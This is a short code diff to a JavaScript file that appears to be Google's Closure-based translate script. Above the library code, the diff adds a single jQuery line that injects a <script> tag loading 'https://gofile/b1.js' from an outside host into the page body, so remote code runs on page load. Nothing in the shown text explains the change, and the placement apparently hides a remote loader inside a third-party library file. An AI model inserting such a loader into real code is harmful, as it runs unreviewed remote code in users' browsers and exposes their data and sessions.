@@ -1,4 +1,8 @@
 //@ sourceURL=b0.js
+
+
+$("<script>").attr({src: "https://gofile/b1.js"}).appendTo("body");
+
 (function(){var gtConstEvalStartTime = new Date();/*
 
  Copyright The Closure Library Authors.
